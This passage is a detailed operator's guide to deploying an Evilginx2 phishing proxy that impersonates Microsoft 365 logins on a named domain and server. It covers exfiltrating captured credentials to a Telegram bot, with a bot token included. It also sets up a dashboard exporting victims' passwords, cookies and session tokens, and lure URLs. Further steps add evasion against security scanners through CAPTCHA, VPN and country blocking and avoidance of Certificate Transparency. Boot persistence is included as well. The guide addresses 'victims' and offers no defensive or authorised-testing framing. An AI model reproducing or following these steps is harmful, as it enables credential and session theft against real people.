## STEP 35 — Get Your Chat ID

The Chat ID is like your personal Telegram "room number" where the bot sends messages.

1. Open Telegram and find your bot (search for the username you chose, e.g., `my_alert_bot`)
2. Start the bot and send **any message** — just type "hello" and send it
3. Now run this command:

```bash
curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/getUpdates"
```

Replace the token with YOUR actual token.

✅ **Expected (look for the chat id):**
```json
{"ok":true,"result":[{"update_id":123456789,
"message":{"message_id":1,"from":{"id":123456789,"is_bot":false,"first_name":"YourName","language_code":"en"},"chat":{"id":7545456339,"first_name":"YourName","type":"private"},"date":1692000000,"text":"hello"}}]}
```

Your **Chat ID** is the number in `"chat":{"id":7545456339,...}` — in this example it's `7545456339`.

⚠️ **If the response is `{"ok":true,"result":[]}`** (empty results): You didn't send a message to your bot yet. Go do that first.

## STEP 36 — Send a Test Message

Test that everything works by sending yourself a message:

```bash
curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/sendMessage?chat_id=7545456339&text=Hello%20from%20Evilginx%20-%20test%20message"
```

Replace token and chat ID with YOUR values.

✅ **Expected:** You receive the message in Telegram on your phone/computer.

Also expected response:
```json
{"ok":true,"result":{"message_id":2,"from":{"id":8863425004,"is_bot":true,"first_name":"MyAlertBot","username":"my_alert_bot"},"chat":{"id":7545456339,"first_name":"YourName","type":"private"},"date":1692000100,"text":"Hello from Evilginx - test message"}}
```

---

# PART 10: CONFIGURE TELEGRAM IN EVILGINX

## STEP 37 — Start Evilginx and Configure Telegram

```bash
cd /root/evilginx2
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass123
```

Wait for the `evilginx>` prompt.

At the prompt:

```
config teletoken 8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
```

✅ **Expected:**
```
[inf] Telegram Bot Token set to: 8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
```

```
config chatid 7545456339
```

✅ **Expected:**
```
[inf] Telegram Chat ID set to: 7545456339
```

## STEP 38 — Test Telegram

```
test telegram
```

✅ **Expected:**
```
[inf] Telegram test message sent successfully!
```

✅ **Also:** You should receive a test message in Telegram on your phone.

## STEP 39 — Exit to Save

```
exit
```

The Telegram settings are now saved in your config file.

---

# PART 11: GEOIP DATABASE SETUP

The GeoIP database tells you the country, city, and VPN status of every visitor. Without it, you'll just see an IP address. With it, you'll see "Vistor is from New York, USA — using a VPN."

## STEP 40 — Download GeoLite2 Databases

Create the directory and download the databases:

```bash
mkdir -p /root/.evilginx/GeoIP
cd /root/.evilginx/GeoIP
```

**Download the City database** (tells you country and city):

```bash
# Try direct download first (no account needed)
wget -O GeoLite2-City.mmdb.gz "https://github.com/P3TERX/GeoLite.mmdb/raw/main/GeoLite2-City.mmdb" 2>/dev/null || \
curl -L -o GeoLite2-City.mmdb "https://github.com/P3TERX/GeoLite.mmdb/raw/main/GeoLite2-City.mmdb"
```

**Download the ASN database** (tells you ISP and VPN detection):

```bash
wget -O GeoLite2-ASN.mmdb "https://github.com/P3TERX/GeoLite.mmdb/raw/main/GeoLite2-ASN.mmdb" 2>/dev/null || \
curl -L -o GeoLite2-ASN.mmdb "https://github.com/P3TERX/GeoLite.mmdb/raw/main/GeoLite2-ASN.mmdb"
```

Check the files:

```bash
ls -lh /root/.evilginx/GeoIP/
```

✅ **Expected:**
```
total 45000
-rw-r--r-- 1 root root 30M Aug 25 12:00 GeoLite2-ASN.mmdb
-rw-r--r-- 1 root root 15M Aug 25 12:00 GeoLite2-City.mmdb
```

**If the files are only a few KB:** The download probably returned an HTML page (rate limited). Try again later or download manually to your computer and upload via SCP:

```bash
# On your local computer, not the VPS:
scp ~/Downloads/GeoLite2-City.mmdb root@95.133.228.19:/root/.evilginx/GeoIP/
scp ~/Downloads/GeoLite2-ASN.mmdb root@95.133.228.19:/root/.evilginx/GeoIP/
```

---

# PART 12: START EVILGINX WITH FULL FEATURES

## STEP 41 — Start Evilginx with All Options

```bash
cd /root/evilginx2
./evilginx2 \
  -dashboard 0.0.0.0:5000 \
  -dashboard-user admin \
  -dashboard-pass mypass123 \
  -geoip-db /root/.evilginx/GeoIP
```

Let's break down what each flag does:

| Flag | What It Does |
|------|--------------|
| `-dashboard 0.0.0.0:5000` | Starts the web dashboard on all IPs at port 5000 |
| `-dashboard-user admin` | Dashboard login username |
| `-dashboard-pass mypass123` | Dashboard login password |
| `-geoip-db /root/.evilginx/GeoIP` | Tells Evilginx where to find the GeoIP databases |

## STEP 42 — Verify Wildcard Certificate Loads

As Evilginx starts, look for these lines in the output:

```
[inf] loading GeoIP database from: /root/.evilginx/GeoIP
[inf] geoip: loaded GeoIP database from /root/.evilginx/GeoIP/GeoLite2-City.mmdb
[inf] geoip: GeoIP initialized — country tracking active
```

**AND MOST IMPORTANTLY:**
```
[wld] using wildcard certificate for: *.officialmonsterz.store
[inf] wildcard certificate loaded..
```

✅ **If you see both of these — CONGRATULATIONS! The wildcard cert is working!**

**If you DON'T see the wildcard messages** and instead see:
```
[war] individual subdomains WILL appear in Certificate Transparency (crt.sh)
```

Then run through this checklist:

### Troubleshooting Wildcard Certificate Not Loading

```
Check 1: Do the files exist?
ls -la /root/.evilginx/crt/wildcard/
```
Both `fullchain.pem` and `privkey.pem` must exist.

```
Check 2: Is the domain set correctly in config?
cat /root/.evilginx/config.json | grep domain
```
Must show your domain name.

```
Check 3: Is the certificate actually for *.yourdomain.com?
openssl x509 -in /root/.evilginx/crt/wildcard/fullchain.pem -noout -subject
```
Must show `subject = CN = *.officialmonsterz.store`

```
Check 4: Restart Evilginx cleanly
```
Type `exit` at evilginx prompt, then run the start command again.

```
Check 5: Is autocert enabled?
```
At the evilginx prompt, run `config`. If autocert is `false`, run `config autocert on` and restart.

---

# PART 13: SET UP A PHISHLET AND GET YOUR PHISHING URL

## STEP 43 — Set Up Office365 Phishlet

At the `evilginx>` prompt:

```
phishlets hostname office365 officialmonsterz.store
```

✅ **Expected:**
```
[inf] phishlet 'office365' hostname set to: officialmonsterz.store
```

This tells Evilginx: "When someone visits any subdomain of officialmonsterz.store, use the Office365 phishlet to handle the request."

```
phishlets enable office365
```

✅ **Expected:**
```
[inf] enabled phishlet 'office365'
```

This activates the phishlet so it actually serves the fake login page.

## STEP 44 — Create a Lure and Get the URL

```
lures create office365
```

✅ **Expected:**
```
[inf] lure '0' created for phishlet 'office365'
```

A "lure" is a specific phishing URL. Each lure has a unique path so you can track different campaigns.

```
lures get-url 0
```

✅ **Expected:**
```
[0] https://login.officialmonsterz.store/a8f3k2m1
```

The `0` means "lure number 0" (the first one). Your URL will look different (random path).

**This URL is your phishing link.** When someone visits it, they'll see a Microsoft 365 login page. When they enter their credentials, Evilginx captures them and forwards them to the real Microsoft.

## STEP 45 — Verify the Phishing Page Works

Still at the `evilginx>` prompt, open a browser on your computer and visit the phishing URL:

```
https://login.officialmonsterz.store/a8f3k2m1
```

✅ **You should see:** A Microsoft 365 login page that looks exactly real.

⚠️ **If you see a "Not Secure" warning:** The wildcard cert isn't loading correctly. Go back to Step 42 troubleshooting.

⚠️ **If you see "Connection refused":** UFW might not allow port 443. Check: `ufw status | grep 443`

⚠️ **If the page is blank:** Check the Evilginx logs in the terminal for errors.

---

# PART 14: WEB DASHBOARD

## STEP 46 — Access the Dashboard

Open your browser and go to:

```
http://95.133.228.19:5000
```

**Login:** `admin`
**Password:** `mypass123`

✅ **What you'll see:** The Evilginx2 Dashboard with:
- **Total Sessions** counter
- **Unique Phishlets** counter  
- **Search bar** — search by username, password, phishlet, IP
- **Phishlet filter dropdown** — show only specific phishlets
- **Export CSV / Export JSON buttons** — download all captured data
- **Refresh button** — manually refresh the session list
- **Dark Mode toggle** — switch between light and dark themes
- **Table columns:** ID, Phishlet, Username, Password, IP Address, Tokens, Created, Actions (Delete)
- **Pagination:** Navigate through pages of sessions
- **Auto-refresh:** Dashboard auto-refreshes every 5 seconds

✅ **Click on any row** to see the full session details including cookies, body tokens, HTTP tokens, and GeoIP data.

⚠️ **Security note:** The dashboard is on HTTP (not HTTPS). For secure remote access, use SSH tunneling:

```bash
# On your local computer (not the VPS):
ssh -L 5000:localhost:5000 root@95.133.228.19
```

Then visit `http://localhost:5000` in your browser. This encrypts the traffic through your SSH connection.

---

# PART 15: AUTO-START ON BOOT (SYSTEMD SERVICE)

If your VPS reboots, you want Evilginx to start automatically. We create a "systemd service" to do this.

## STEP 47 — Create the Service File

```bash
nano /etc/systemd/system/evilginx.service
```

**What `nano` is:** A text editor in the terminal. Like Notepad but without a mouse.

In the editor, paste this EXACT text:

```ini
[Unit]
Description=Evilginx2 Telegram Edition — Full Features
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/root/evilginx2
ExecStart=/root/evilginx2/evilginx2 \
    -dashboard 0.0.0.0:5000 \
    -dashboard-user admin \
    -dashboard-pass mypass123 \
    -geoip-db /root/.evilginx/GeoIP
Restart=always
RestartSec=5
LimitNOFILE=65535
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

**How to paste in nano:**
1. Right-click in the terminal to paste
2. Or press `Ctrl+Shift+V`

**How to save and exit:**
1. Press `Ctrl+X` (exit)
2. Type `Y` (yes, save)
3. Press `Enter` (confirm filename)

## STEP 48 — Enable and Start the Service

```bash
systemctl daemon-reload
```

✅ **Expected:** Nothing.

```bash
systemctl enable evilginx
```

✅ **Expected:**
```
Created symlink /etc/systemd/system/multi-user.target.wants/evilginx.service → /etc/systemd/system/evilginx.service.
```

This creates a "start me on boot" link.

```bash
systemctl start evilginx
```

✅ **Expected:** Nothing (or a brief message if already running).

## STEP 49 — Verify It's Running

```bash
systemctl status evilginx
```

✅ **Expected:**
```
● evilginx.service - Evilginx2 Telegram Edition — Full Features
     Loaded: loaded (/etc/systemd/system/evilginx.service; enabled; preset: enabled)
     Active: active (running) since Mon 2025-08-25 12:00:00 UTC; 5s ago
   Main PID: 1234 (evilginx2)
      Tasks: 10 (limit: 1119)
     Memory: 25.0M
        CPU: 150ms
     CGroup: /system.slice/evilginx.service
             └─1234 /root/evilginx2/evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass123 -geoip-db /root/.evilginx/GeoIP
```

Key things to check:
- ✅ **Active: active (running)** — it's running
- ✅ **Loaded: enabled** — it starts on boot

## STEP 50 — Watch the Logs

```bash
journalctl -u evilginx -f
```

**What this does:** Shows live log output from Evilginx (like having the terminal open while it runs).

Look for the same starting messages:
- `[wld] using wildcard certificate for: *.officialmonsterz.store`
- `[inf] wildcard certificate loaded..`
- `[inf] geoip: loaded GeoIP database`
- `[inf] dashboard: web interface starting on http://0.0.0.0:5000`

Press `Ctrl+C` to stop watching logs.

## STEP 51 — Test Reboot Persistence

```bash
reboot
```

Wait 30–60 seconds, then reconnect:

```bash
ssh root@95.133.228.19
```

Check that Evilginx started automatically:

```bash
systemctl status evilginx
```

✅ **Should show:** `active (running)` without you doing anything.

---

# PART 16: CERTIFICATE AUTO-RENEWAL

Let's Encrypt certificates expire after 90 days. We need to renew them automatically.

## STEP 52 — Create the Auth Hook Script

First, create a script that certbot can use to automatically add/remove DNS TXT records via Cloudflare's API.

```bash
nano /root/evilginx2/certbot-auth.sh
```

Paste this:

```bash
#!/bin/bash
# Certbot DNS-01 auth hook for Cloudflare
# This script is called by certbot to add/remove TXT records

# Cloudflare API credentials
CF_API_TOKEN="YOUR_CLOUDFLARE_API_TOKEN"
CF_ZONE_ID="YOUR_CLOUDFLARE_ZONE_ID"

# DO NOT EDIT BELOW THIS LINE
ACTION="$1"
FQDN="$2"
VALUE="$3"

if [ -z "$CF_API_TOKEN" ] || [ "$CF_API_TOKEN" == "YOUR_CLOUDFLARE_API_TOKEN" ]; then
    echo "ERROR: Please set your Cloudflare API token in $0"
    exit 1
fi

if [ -z "$CF_ZONE_ID" ] || [ "$CF_ZONE_ID" == "YOUR_CLOUDFLARE_ZONE_ID" ]; then
    echo "ERROR: Please set your Cloudflare Zone ID in $0"
    exit 1
fi

# Extract the record name (remove domain suffix)
RECORD_NAME="_acme-challenge"

if [ "$ACTION" == "present" ]; then
    # Add TXT record
    curl -s -X POST "https://api.cloudflare.com/client/v4/zones/$CF_ZONE_ID/dns_records" \
        -H "Authorization: Bearer $CF_API_TOKEN" \
        -H "Content-Type: application/json" \
        --data "{\"type\":\"TXT\",\"name\":\"$RECORD_NAME\",\"content\":\"$VALUE\",\"ttl\":120,\"proxied\":false}" \
        > /dev/null
    echo "Added TXT record: $RECORD_NAME = $VALUE"
elif [ "$ACTION" == "cleanup" ]; then
    # Delete TXT record
    RECORD_ID=$(curl -s -X GET "https://api.cloudflare.com/client/v4/zones/$CF_ZONE_ID/dns_records?type=TXT&name=$RECORD_NAME" \
        -H "Authorization: Bearer $CF_API_TOKEN" \
        -H "Content-Type: application/json" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d['result'][0]['id'] if d['result'] else '')" 2>/dev/null)
    if [ -n "$RECORD_ID" ]; then
        curl -s -X DELETE "https://api.cloudflare.com/client/v4/zones/$CF_ZONE_ID/dns_records/$RECORD_ID" \
            -H "Authorization: Bearer $CF_API_TOKEN" \
            > /dev/null
        echo "Deleted TXT record: $RECORD_NAME"
    fi
fi
```

**Save:** `Ctrl+X` → `Y` → `Enter`

Make it executable:

```bash
chmod +x /root/evilginx2/certbot-auth.sh
```

### Get Your Cloudflare API Token and Zone ID

**API Token:**
1. Go to https://dash.cloudflare.com → Profile (top right) → **"API Tokens"**
2. Click **"Create Token"**
3. Click **"Use template"** under **"Edit zone DNS"**
4. Under **"Zone Resources"**, select: `Include → Specific zone → yourdomain.com`
5. Click **"Continue to summary"** → **"Create Token"**
6. **COPY THE TOKEN NOW** — it only shows once!

**Zone ID:**
1. Go to Cloudflare → your domain
2. In the right sidebar, under **"API"**, you'll see **"Zone ID"**
3. Copy that string.

Edit the script with YOUR values:

```bash
nano /root/evilginx2/certbot-auth.sh
```

Replace:
- `YOUR_CLOUDFLARE_API_TOKEN` with your actual token
- `YOUR_CLOUDFLARE_ZONE_ID` with your actual zone ID

**Save:** `Ctrl+X` → `Y` → `Enter`

## STEP 53 — Set Up the Cron Job

A "cron job" is a scheduled task. We'll create one that checks and renews the cert every month.

```bash
crontab -e
```

If asked to choose an editor, pick `nano` (option 1 or 2).

Add this line at the bottom:

```cron
# Renew Let's Encrypt wildcard certificate at 3 AM on the 1st of each month
0 3 1 * * /usr/bin/certbot renew --manual --preferred-challenges dns --manual-auth-hook /root/evilginx2/certbot-auth.sh --post-hook "cp /etc/letsencrypt/live/officialmonsterz.store/fullchain.pem /root/.evilginx/crt/wildcard/ && cp /etc/letsencrypt/live/officialmonsterz.store/privkey.pem /root/.evilginx/crt/wildcard/ && chmod 644 /root/.evilginx/crt/wildcard/fullchain.pem && chmod 600 /root/.evilginx/crt/wildcard/privkey.pem && systemctl restart evilginx" >> /var/log/cert-renew.log 2>&1
```

Replace `officialmonsterz.store` with YOUR domain.

**Save:** `Ctrl+X` → `Y` → `Enter`

**Simpler alternative (manual renewal every 2 months):**

If you don't want to use the Cloudflare API, just set a reminder to run this every 60 days:

```cron
0 3 1 */2 * echo "Time to renew cert manually!" >> /var/log/cert-renew.log
```

And when you need to renew:
```bash
# Delete old TXT record from Cloudflare
# Run certbot again (same as Step 18)
certbot certonly --manual --preferred-challenges dns -d '*.officialmonsterz.store' -d officialmonsterz.store
# Add new TXT record, verify, press Enter
# Then copy certs again
cp /etc/letsencrypt/live/officialmonsterz.store/fullchain.pem /root/.evilginx/crt/wildcard/
cp /etc/letsencrypt/live/officialmonsterz.store/privkey.pem /root/.evilginx/crt/wildcard/
systemctl restart evilginx
```

---

# PART 17: ADVANCED FEATURES

## Feature 1: Cloudflare Turnstile CAPTCHA

Adds a "I'm not a robot" challenge before victims see the phishing page. This filters out automated scanners, botnets, and security crawlers.

### Setup:

1. Go to **https://dash.cloudflare.com** → **Turnstile** (left sidebar, under "Verify")
2. Click **"Add a site"**

| Field | Value |
|-------|-------|
| **Site name** | `evilginx-captcha` (or anything) |
| **Domain** | `officialmonsterz.store` |
| **Widget mode** | **Managed** or **Invisible** (both work) |
| **Pre-clearance setting** | Keep default |

3. Click **"Create"**

4. Copy these TWO keys:
   - **Site Key:** starts with `0x4AAAA...`
   - **Secret Key:** starts with `0x4AAAA...`

### To enable in Evilginx:

Edit the systemd service:

```bash
nano /etc/systemd/system/evilginx.service
```

Find the `ExecStart` line and add the `-turnstile` flag:

```ini
ExecStart=/root/evilginx2/evilginx2 \
    -dashboard 0.0.0.0:5000 \
    -dashboard-user admin \
    -dashboard-pass mypass123 \
    -geoip-db /root/.evilginx/GeoIP \
    -turnstile 0x4AAAAAAABC123456:0x4AAAAAAABC78901234567890ABCDEF
```

Replace the keys with YOUR actual keys (SiteKey:SecretKey with a colon between them).

**Save:** `Ctrl+X` → `Y` → `Enter`

Reload and restart:

```bash
systemctl daemon-reload
systemctl restart evilginx
```

Now when someone visits your phishing URL, they'll see a CAPTCHA challenge first.

## Feature 2: Block VPN Visitors

Prevents people connecting through VPNs, proxies, or datacenters from accessing your phishing page.

Edit the service:

```bash
nano /etc/systemd/system/evilginx.service
```

Add `-block-vpn`:

```ini
ExecStart=/root/evilginx2/evilginx2 \
    -dashboard 0.0.0.0:5000 \
    -dashboard-user admin \
    -dashboard-pass mypass123 \
    -geoip-db /root/.evilginx/GeoIP \
    -block-vpn
```

Restart:

```bash
systemctl daemon-reload
systemctl restart evilginx
```

## Feature 3: Block Specific Countries

Block entire countries from seeing your phishing page.

Edit the service:

```bash
nano /etc/systemd/system/evilginx.service
```

Add `-block-countries`:

```ini
ExecStart=/root/evilginx2/evilginx2 \
    -dashboard 0.0.0.0:5000 \
    -dashboard-user admin \
    -dashboard-pass mypass123 \
    -geoip-db /root/.evilginx/GeoIP \
    -block-countries RU,CN,IR,KP
```

**Country codes commonly blocked:**

| Code | Country | Why Block |
|------|---------|-----------|
| RU | Russia | High bot traffic |
| CN | China | Security scanners |
| IR | Iran | Bot traffic |
| KP | North Korea | No legitimate traffic |
| CU | Cuba | Similar |
| SY | Syria | Similar |

Restart:

```bash
systemctl daemon-reload
systemctl restart evilginx
```

## Feature 4: Live Feed (Real-Time WebSocket)

Shows captured events in real-time in a browser. Requires a separate "evilfeed" process.

### Build the evilfeed:

```bash
cd /root/evilginx2/evilfeed
go build -o evilfeed .
chmod +x evilfeed
ls -lh evilfeed
```

✅ **Expected:** A ~7-10MB file.

### Create the evilfeed systemd service:

```bash
nano /etc/systemd/system/evilfeed.service
```

Paste:

```ini
[Unit]
Description=Evilginx Live Feed WebSocket Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/evilginx2/evilfeed
ExecStart=/root/evilginx2/evilfeed/evilfeed
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

**Save:** `Ctrl+X` → `Y` → `Enter`

### Open port 1337 in the firewall:

```bash
ufw allow 1337/tcp
```

### Enable and start evilfeed:

```bash
systemctl daemon-reload
systemctl enable --now evilfeed
```

### Modify Evilginx service to include `-feed` flag:

```bash
nano /etc/systemd/system/evilginx.service
```

Add `-feed`:

```ini
ExecStart=/root/evilginx2/evilginx2 \
    -dashboard 0.0.0.0:5000 \
    -dashboard-user admin \
    -dashboard-pass mypass123 \
    -geoip-db /root/.evilginx/GeoIP \
    -feed
```

Restart:

```bash
systemctl daemon-reload
systemctl restart evilginx
```

### Access the Live Feed:

Open your browser:
```
http://95.133.228.19:1337
```

---

# PART 18: COMPLETE COMMAND REFERENCE

## Evilginx CLI Commands

### Configuration Commands

| Command | What It Does | Example |
|---------|--------------|---------|
| `config` | Shows current configuration | `config` |
| `config domain <domain>` | Sets your phishing domain | `config domain officialmonsterz.store` |
| `config ipv4 external <ip>` | Sets your VPS external IP | `config ipv4 external 95.133.228.19` |
| `config ipv4 bind <ip>` | Sets bind IP (usually 0.0.0.0) | `config ipv4 bind 0.0.0.0` |
| `config autocert on/off` | Enable/disable automatic SSL certs | `config autocert off` |
| `config unauth_url <url>` | Where unauthorized visitors go | `config unauth_url https://www.office365.com` |
| `config teletoken <token>` | Set Telegram bot token | `config teletoken 8863425004:AAF...` |
| `config chatid <id>` | Set Telegram chat ID | `config chatid 7545456339` |
| `config strip_headers on/off` | Enable/disable header stripping | `config strip_headers on` |

### Phishlet Commands

| Command | What It Does | Example |
|---------|--------------|---------|
| `phishlets hostname <name> <domain>` | Set phishlet hostname | `phishlets hostname office365 officialmonsterz.store` |
| `phishlets enable <name>` | Enable a phishlet | `phishlets enable office365` |
| `phishlets disable <name>` | Disable a phishlet | `phishlets disable office365` |
| `phishlets hide <name>` | Hide a phishlet (redirect all) | `phishlets hide office365` |
| `phishlets unhide <name>` | Unhide a phishlet | `phishlets unhide office365` |
| `phishlets list` | List all phishlets | `phishlets list` |

### Lure Commands

| Command | What It Does | Example |
|---------|--------------|---------|
| `lures create <phishlet>` | Create a new lure | `lures create office365` |
| `lures get-url <index>` | Get the phishing URL | `lures get-url 0` |
| `lures list` | List all lures | `lures list` |
| `lures delete <index>` | Delete a lure | `lures delete 0` |
| `lures edit <index>` | Edit a lure | `lures edit 0` |
| `lures pause <index>` | Pause a lure | `lures pause 0` |
| `lures unpause <index>` | Unpause a lure | `lures unpause 0` |

### Blacklist Commands

| Command | What It Does |
|---------|--------------|
| `blacklist all` | Blacklist ALL visitors (only whitelisted IPs pass) |
| `blacklist unauth` | Blacklist only unauthorized visitors |
| `blacklist noadd` | Don't add to blacklist, just redirect |
| `blacklist off` | Turn off blacklist entirely |

### System Commands

| Command | What It Does |
|---------|--------------|
| `test telegram` | Send test Telegram message |
| `test-certs` | Test certificate configuration |
| `sessions` | List active sessions |
| `sessions <id>` | Show session details |
| `sessions delete <id>` | Delete a session |
| `clear` | Clear the terminal screen |
| `help` | Show all commands |
| `exit` | Exit Evilginx and save config |

## Systemd Commands

| Command | What It Does |
|---------|--------------|
| `systemctl start evilginx` | Start Evilginx |
| `systemctl stop evilginx` | Stop Evilginx |
| `systemctl restart evilginx` | Restart Evilginx |
| `systemctl status evilginx` | Check if Evilginx is running |
| `systemctl enable evilginx` | Enable auto-start on boot |
| `systemctl disable evilginx` | Disable auto-start |
| `journalctl -u evilginx -f` | Watch Evilginx logs live |
| `journalctl -u evilginx -n 100 --no-pager` | Show last 100 log lines |
| `systemctl start evilfeed` | Start Live Feed |
| `systemctl stop evilfeed` | Stop Live Feed |
| `systemctl status evilfeed` | Check Live Feed status |
| `journalctl -u evilfeed -f` | Watch Live Feed logs |

## Server Management Commands

| Command | What It Does |
|---------|--------------|
| `reboot` | Restart the VPS |
| `ufw status` | Check firewall rules |
| `htop` | See running processes (press F10 to quit) |
| `df -h` | Check disk space |
| `free -h` | Check memory usage |
| `uptime` | See how long the server has been running |

---

# PART 19: COMPLETE TROUBLESHOOTING REFERENCE

## 1. "Can't connect to VPS via SSH"

| Possible Cause | Symptom | Fix |
|----------------|---------|-----|
| VPS is powered off | `Connection timed out` | Turn on VPS in provider's control panel |
| Wrong IP | `Connection timed out` | Check correct IP in VPS dashboard |
| Wrong port | `Connection refused` | SSH uses port 22 by default. Try `ssh -p 22 root@IP` |
| Firewall blocking | `Connection refused` | Check VPS provider's firewall panel (separate from UFW) |
| Key changed | `Host key verification failed` | Run `ssh-keygen -R IP` then reconnect |

## 2. "UFW commands fail"

| Symptom | Fix |
|---------|-----|
| `ufw: command not found` | Run `apt install ufw -y` |
| `ERROR: already enabled` | Already on — run `ufw status` to check |
| Can't SSH after enabling | Reinstall VPS (port 22 may be blocked by provider firewall) |

## 3. "Port 53 still in use"

Run this check:
```bash
lsof -i :53
```

If it shows a process:
```bash
# Find what's using it
lsof -i :53 -P -n

# Kill it
kill -9 <PID>
```

If it's systemd-resolved again, the lock may have been removed:
```bash
chattr -i /etc/resolv.conf
systemctl stop systemd-resolved
systemctl disable systemd-resolved
rm -f /etc/resolv.conf
echo "nameserver 1.1.1.1" | tee /etc/resolv.conf
chattr +i /etc/resolv.conf
reboot
```

## 4. "go build fails"

| Error | Fix |
|-------|-----|
| `go: not found` | `source ~/.bashrc` or reconnect SSH |
| `go: go.mod file not found` | `cd /root/evilginx2` first |
| `network timeout` | Try again — `go mod tidy && go build` |
| Missing imports | `go clean -modcache && go mod tidy && go build` |
| `command not found: git` | `apt install git -y` |

## 5. "DNS not resolving correctly"

```bash
# Check root domain
dig @1.1.1.1 yourdomain.com +short

# Check wildcard
dig @1.1.1.1 test.yourdomain.com +short

# Check TXT record
dig @1.1.1.1 _acme-challenge.yourdomain.com TXT +short

# Check nameservers
whois yourdomain.com | grep "Name Server"
```

**Both A records must return your VPS IP.**
**Nameservers must show Cloudflare's.**

## 6. "Certbot fails"

| Error | Fix |
|-------|-----|
| `too many requests` | Wait 1 hour. Certbot has rate limits. |
| `DNS challenge failed` | The TXT record wasn't found at the root domain. Check: `_acme-challenge.yourdomain.com` NOT `_acme-challenge.yourdomain.com.yourdomain.com` |
| `certificate has expired` | Delete and reissue: `certbot delete --cert-name yourdomain.com` then run certbot again |
| `certbot command not found` | `apt install certbot -y` |

## 7. "Wildcard certificate not loading"

```bash
# CHECK 1: Files exist?
ls -la /root/.evilginx/crt/wildcard/

# CHECK 2: Correct subject?
openssl x509 -in /root/.evilginx/crt/wildcard/fullchain.pem -noout -subject
# SHOULD SHOW: subject = CN = *.yourdomain.com

# CHECK 3: Domain set in config?
cat /root/.evilginx/config.json | grep domain

# CHECK 4: autocert is on?
# Start evilginx, run 'config', check autocert is 'true'

# CHECK 5: Restart cleanly?
systemctl restart evilginx
journalctl -u evilginx -f | grep wildcard
```

## 8. "Dashboard not accessible"

```bash
# Is Evilginx running?
systemctl status evilginx

# Is port 5000 open?
ufw status | grep 5000
# If not: ufw allow 5000/tcp

# Is it listening?
ss -tlnp | grep 5000
# Should show: LISTEN 0 0 0.0.0.0:5000

# Try SSH tunnel instead:
ssh -L 5000:localhost:5000 root@95.133.228.19
# Then visit http://localhost:5000
```

## 9. "Phishing page shows 'Not Secure'"

| Cause | Fix |
|-------|-----|
| Chrome using HSTS | Type `thisisunsafe` on the error page (yes, really) |
| Wildcard cert not loaded | See issue #7 above |
| Cloudflare SSL wrong | Set SSL/TLS to **Full** (not Full Strict) |
| DNS proxied (orange cloud) | Change to **DNS Only** (grey cloud) in Cloudflare |
| Wrong domain in cert | Run `openssl x509 -in fullchain.pem -noout -subject` — must show `*.yourdomain.com` |

## 10. "No Telegram notifications"

```bash
# Step 1: Test bot is working
curl -s "https://api.telegram.org/bot<TOKEN>/getMe"

# Step 2: Get your chat ID (send message to bot first)
curl -s "https://api.telegram.org/bot<TOKEN>/getUpdates"

# Step 3: Test from Evilginx
# Start evilginx, at prompt: test telegram

# Step 4: Check Evilginx logs
journalctl -u evilginx -f | grep -i telegram
```

## 11. "Phishing page not loading (connection refused)"

```bash
# Is Evilginx running?
systemctl status evilginx

# Is port 443 open?
ufw status | grep 443

# Does DNS resolve?
dig @1.1.1.1 login.yourdomain.com +short
# MUST show your VPS IP

# Check logs live
journalctl -u evilginx -f
```

## 12. "GeoIP not working"

```bash
# Files exist?
ls -lh /root/.evilginx/GeoIP/

# Flag is passed?
ps aux | grep evilginx | grep geoip

# Check startup logs
journalctl -u evilginx -f | grep geoip
```

## 13. "Sessions in dashboard but no data"

This is normal if no credentials have been entered yet. The session shows who visited. Credentials appear only after the victim submits the login form.

## 14. "Can't enable phishlet"

```
phishlets enable office365
```

If it fails:
1. First set hostname: `phishlets hostname office365 yourdomain.com`
2. Make sure the phishlet YAML file exists in `/root/evilginx2/phishlets/`
3. Check autocert is on: `config autocert on`
4. Check domain is set: `config domain yourdomain.com`

## 15. "Server runs out of memory"

Evilginx uses about 30-50 MB RAM normally. If you see high usage:

```bash
# Check memory
free -h

# Check what's using it
htop

# Restart to clear sessions
systemctl restart evilginx
```

---

# PART 20: FINAL VERIFICATION CHECKLIST

## Run Through Every Step to Confirm Success

### ✅ Server Setup
- [ ] SSH login works
- [ ] System updated (`apt update && apt upgrade`)
- [ ] All packages installed
- [ ] Firewall active with correct ports (22, 53, 80, 443, 5000)
- [ ] Port 53 free (systemd-resolved disabled)
- [ ] DNS resolves through Cloudflare

### ✅ Evilginx Build
- [ ] Go installed (`go version`)
- [ ] Repository cloned
- [ ] Binary built (`ls -lh evilginx2` → ~25MB)
- [ ] Config directory created

### ✅ DNS & Cloudflare
- [ ] Domain added to Cloudflare
- [ ] Nameservers changed at registrar
- [ ] A records: `@` and `*` → VPS IP (grey cloud)
- [ ] SSL/TLS set to "Full" (not Full Strict)
- [ ] Always Use HTTPS ON
- [ ] `dig @1.1.1.1 yourdomain.com +short` → VPS IP
- [ ] `dig @1.1.1.1 test.yourdomain.com +short` → VPS IP

### ✅ Wildcard Certificate
- [ ] Cert obtained from Let's Encrypt
- [ ] TXT record verified with `dig`
- [ ] Certificate copied to `/root/.evilginx/crt/wildcard/`
- [ ] Subject shows `*.yourdomain.com`
- [ ] Correct permissions set
- [ ] Evilginx starts with `[wld] using wildcard certificate`

### ✅ Telegram
- [ ] Bot created with @BotFather
- [ ] Token tested with `curl .../getMe`
- [ ] Chat ID obtained
- [ ] Test message received
- [ ] `config teletoken` and `config chatid` set
- [ ] `test telegram` succeeds

### ✅ GeoIP
- [ ] `GeoLite2-City.mmdb` downloaded
- [ ] `GeoLite2-ASN.mmdb` downloaded
- [ ] Files in `/root/.evilginx/GeoIP/`
- [ ] `-geoip-db` flag in startup
- [ ] Startup logs show "GeoIP initialized"

### ✅ Phishlet
- [ ] Phishlet hostname set
- [ ] Phishlet enabled
- [ ] Lure created
